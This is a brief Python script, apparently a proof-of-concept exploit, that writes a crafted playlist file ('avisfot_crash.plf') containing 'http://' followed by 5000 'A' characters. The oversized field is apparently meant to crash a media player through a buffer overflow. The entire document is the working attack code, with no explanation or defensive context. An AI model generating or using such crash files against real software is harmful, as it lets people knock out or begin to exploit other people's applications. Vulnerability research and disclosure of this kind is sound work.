#!/usr/bin/python

file = open("avisfot_crash.plf","wb")

buffer = "http://"
buffer += "A"*5000

file.write(buffer)

file.close()
